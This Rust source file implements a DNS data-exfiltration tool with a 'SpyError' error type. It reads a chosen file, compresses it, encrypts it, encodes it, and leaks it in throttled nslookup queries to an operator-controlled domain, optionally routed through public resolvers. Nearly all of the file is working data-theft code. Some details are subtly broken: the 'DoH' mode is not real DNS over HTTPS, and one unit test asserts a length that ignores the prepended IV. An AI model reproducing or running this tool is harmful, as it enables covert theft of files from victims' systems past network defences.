use base64::{Engine as _, engine::general_purpose};
use data_encoding::BASE32_NOPAD;
use flate2::write::GzEncoder;
use flate2::Compression;
use log::{debug, error, info};
use aes::Aes256;
use ctr::{Ctr64BE, cipher::{KeyIvInit, StreamCipher}};
use rand::{thread_rng, RngCore};
use std::fs::File;
use std::io::{self, Read, Write};
use std::path::Path;
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;
use crate::error::{Result, SpyError};

const MAX_DNS_LABEL_SIZE: usize = 63;
const MAX_DNS_NAME_SIZE: usize = 255;
const MAX_THROTTLE_TIME: u64 = 10000; // 10 seconds

type Aes256Ctr = Ctr64BE<Aes256>;

#[derive(Debug, Clone)]
pub struct DNSExfiltrator {
    domain_name: String,
    password: String,
    use_base32: bool,
    throttle_time: u64,
    request_max_size: usize,
    label_max_size: usize,
    doh_provider: Option<String>,
    dns_server: Option<String>,
}

impl DNSExfiltrator {
    pub fn new(domain_name: String, password: String) -> Result<Self> {
        // Validate domain name
        if domain_name.is_empty() {
            return Err(SpyError::InvalidConfig("Domain name cannot be empty".into()));
        }
        if domain_name.len() > MAX_DNS_NAME_SIZE {
            return Err(SpyError::InvalidConfig(format!(
                "Domain name exceeds maximum length of {} characters",
                MAX_DNS_NAME_SIZE
            )));
        }

        // Validate password
        if password.is_empty() {
            return Err(SpyError::InvalidConfig("Password cannot be empty".into()));
        }

        Ok(Self {
            domain_name,
            password,
            use_base32: false,
            throttle_time: 0,
            request_max_size: MAX_DNS_NAME_SIZE,
            label_max_size: MAX_DNS_LABEL_SIZE,
            doh_provider: None,
            dns_server: None,
        })
    }

    pub fn set_options(&mut self, use_base32: bool, throttle_time: u64, request_max_size: usize, label_max_size: usize) -> Result<()> {
        // Validate throttle time
        if throttle_time > MAX_THROTTLE_TIME {
            return Err(SpyError::InvalidConfig(format!(
                "Throttle time exceeds maximum value of {} ms",
                MAX_THROTTLE_TIME
            )));
        }

        // Validate request size
        if request_max_size > MAX_DNS_NAME_SIZE {
            return Err(SpyError::InvalidConfig(format!(
                "Request size exceeds maximum DNS name length of {} characters",
                MAX_DNS_NAME_SIZE
            )));
        }

        // Validate label size
        if label_max_size > MAX_DNS_LABEL_SIZE {
            return Err(SpyError::InvalidConfig(format!(
                "Label size exceeds maximum DNS label length of {} characters",
                MAX_DNS_LABEL_SIZE
            )));
        }

        self.use_base32 = use_base32;
        self.throttle_time = throttle_time;
        self.request_max_size = request_max_size;
        self.label_max_size = label_max_size;
        Ok(())
    }

    pub fn set_dns_options(&mut self, doh_provider: Option<String>, dns_server: Option<String>) -> Result<()> {
        // Validate DoH provider
        if let Some(provider) = &doh_provider {
            match provider.as_str() {
                "google" | "cloudflare" => {}
                _ => return Err(SpyError::InvalidConfig(format!(
                    "Unsupported DoH provider: {}. Supported providers are 'google' and 'cloudflare'",
                    provider
                ))),
            }
        }

        // Validate that we don't have both DoH and DNS server
        if doh_provider.is_some() && dns_server.is_some() {
            return Err(SpyError::InvalidConfig(
                "Cannot specify both DoH provider and DNS server".into()
            ));
        }

        self.doh_provider = doh_provider;
        self.dns_server = dns_server;
        Ok(())
    }

    pub fn exfiltrate(&self, file_path: &Path) -> Result<()> {
        info!("Starting exfiltration of file: {}", file_path.display());
        
        // Validate file exists and is readable
        if !file_path.exists() {
            return Err(SpyError::Io(io::Error::new(
                io::ErrorKind::NotFound,
                "File not found"
            )));
        }

        let mut file = File::open(file_path).map_err(SpyError::Io)?;
        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer).map_err(SpyError::Io)?;
        debug!("File size: {} bytes", buffer.len());

        let compressed_data = self.compress_data(&buffer)?;
        debug!("Compressed size: {} bytes", compressed_data.len());

        let encrypted_data = self.encrypt_data(&compressed_data);
        debug!("Encrypted size: {} bytes", encrypted_data.len());

        let encoded_data = if self.use_base32 {
            BASE32_NOPAD.encode(&encrypted_data)
        } else {
            general_purpose::URL_SAFE_NO_PAD.encode(&encrypted_data)
        };
        debug!("Encoded size: {} bytes", encoded_data.len());

        self.send_data(&encoded_data)?;
        info!("Exfiltration completed successfully");
        Ok(())
    }

    fn compress_data(&self, data: &[u8]) -> Result<Vec<u8>> {
        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder.write_all(data).map_err(SpyError::Io)?;
        encoder.finish().map_err(SpyError::Io)
    }

    fn encrypt_data(&self, data: &[u8]) -> Vec<u8> {
        let mut buffer = data.to_vec();
        let mut iv = [0u8; 16];
        thread_rng().fill_bytes(&mut iv);
        
        // Derive a 32-byte key from the password using the first 32 bytes, padded with zeros if necessary
        let mut key = [0u8; 32];
        let pass_bytes = self.password.as_bytes();
        for (i, &byte) in pass_bytes.iter().take(32).enumerate() {
            key[i] = byte;
        }

        let mut cipher = Aes256Ctr::new(&key.into(), &iv.into());
        cipher.apply_keystream(&mut buffer);

        // Prepend IV to the encrypted data
        let mut result = Vec::with_capacity(iv.len() + buffer.len());
        result.extend_from_slice(&iv);
        result.extend_from_slice(&buffer);
        result
    }

    fn send_data(&self, data: &str) -> Result<()> {
        let chunks = self.chunk_data(data);
        info!("Sending {} chunks", chunks.len());

        for (i, chunk) in chunks.iter().enumerate() {
            let domain = format!("{}.{}.{}", i, chunk, self.domain_name);
            debug!("Sending chunk {}/{}", i + 1, chunks.len());
            
            self.send_dns_request(&domain).map_err(|e| {
                error!("Failed to send chunk {}/{}: {}", i + 1, chunks.len(), e);
                e
            })?;

            if self.throttle_time > 0 {
                debug!("Throttling for {} ms", self.throttle_time);
                sleep(Duration::from_millis(self.throttle_time));
            }
        }

        Ok(())
    }

    fn chunk_data(&self, data: &str) -> Vec<String> {
        let mut chunks = Vec::new();
        let mut current_chunk = String::new();
        let mut current_label = String::new();

        for c in data.chars() {
            if current_label.len() >= self.label_max_size {
                if !current_chunk.is_empty() {
                    current_chunk.push('.');
                }
                current_chunk.push_str(&current_label);
                current_label.clear();
            }
            
            if current_chunk.len() >= self.request_max_size {
                chunks.push(current_chunk);
                current_chunk = String::new();
            }
            
            current_label.push(c);
        }

        // Handle remaining data
        if !current_label.is_empty() {
            if !current_chunk.is_empty() {
                current_chunk.push('.');
            }
            current_chunk.push_str(&current_label);
        }

        if !current_chunk.is_empty() {
            chunks.push(current_chunk);
        }

        chunks
    }

    fn send_dns_request(&self, domain: &str) -> Result<()> {
        let mut cmd = Command::new("nslookup");
        
        if let Some(dns_server) = &self.dns_server {
            cmd.arg(dns_server);
        }
        
        if let Some(doh_provider) = &self.doh_provider {
            match doh_provider.as_str() {
                "google" => {
                    cmd.arg("--type=TXT");
                    cmd.arg("dns.google.com");
                }
                "cloudflare" => {
                    cmd.arg("--type=TXT");
                    cmd.arg("1.1.1.1");
                }
                _ => return Err(SpyError::DnsExfiltration(
                    format!("Unknown DoH provider: {}", doh_provider)
                )),
            };
        }
        
        cmd.arg(domain);
        
        let output = cmd.output().map_err(|e| {
            error!("DNS request failed: {}", e);
            SpyError::DnsExfiltration(format!("Failed to execute DNS request: {}", e))
        })?;

        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            error!("DNS request failed: {}", error_msg);
            return Err(SpyError::DnsExfiltration(error_msg.to_string()));
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::NamedTempFile;
    use std::io::Write;

    #[test]
    fn test_new_valid_input() {
        let result = DNSExfiltrator::new("example.com".to_string(), "password123".to_string());
        assert!(result.is_ok());
    }

    #[test]
    fn test_new_empty_domain() {
        let result = DNSExfiltrator::new("".to_string(), "password123".to_string());
        assert!(result.is_err());
    }

    #[test]
    fn test_new_empty_password() {
        let result = DNSExfiltrator::new("example.com".to_string(), "".to_string());
        assert!(result.is_err());
    }

    #[test]
    fn test_set_options_valid() {
        let mut exfiltrator = DNSExfiltrator::new("example.com".to_string(), "password123".to_string()).unwrap();
        let result = exfiltrator.set_options(true, 1000, 200, 60);
        assert!(result.is_ok());
    }

    #[test]
    fn test_set_options_invalid_throttle() {
        let mut exfiltrator = DNSExfiltrator::new("example.com".to_string(), "password123".to_string()).unwrap();
        let result = exfiltrator.set_options(true, MAX_THROTTLE_TIME + 1, 200, 60);
        assert!(result.is_err());
    }

    #[test]
    fn test_compress_encrypt_data() {
        let exfiltrator = DNSExfiltrator::new("example.com".to_string(), "password123".to_string()).unwrap();
        let test_data = b"Hello, World!";
        
        let compressed = exfiltrator.compress_data(test_data).unwrap();
        assert!(!compressed.is_empty());
        
        let encrypted = exfiltrator.encrypt_data(&compressed);
        assert_eq!(encrypted.len(), compressed.len());
    }

    #[test]
    fn test_chunk_data() {
        let exfiltrator = DNSExfiltrator::new("example.com".to_string(), "password123".to_string()).unwrap();
        let test_data = "a".repeat(100);
        let chunks = exfiltrator.chunk_data(&test_data);
        
        for chunk in &chunks {
            assert!(chunk.len() <= MAX_DNS_NAME_SIZE);
            
            for label in chunk.split('.') {
                assert!(label.len() <= MAX_DNS_LABEL_SIZE);
            }
        }
    }
} 